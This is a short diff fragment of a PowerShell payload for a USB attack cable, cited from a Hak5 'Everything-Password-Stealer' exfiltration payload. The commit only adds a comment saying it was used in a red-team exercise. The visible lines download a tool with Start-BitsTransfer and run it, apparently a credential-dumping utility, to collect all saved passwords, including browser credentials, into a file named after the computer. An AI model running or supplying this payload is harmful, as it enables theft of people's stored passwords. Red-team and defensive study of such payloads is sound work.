@@ -8,3 +8,5 @@ $Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-Bit
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
 
 ## referenced from https://github.com/hak5/omg-payloads/blob/master/payloads/library/exfiltration/Everything-Password-Stealer/payload.txt
+## Used as a red team exercise using the OMG Cable
+
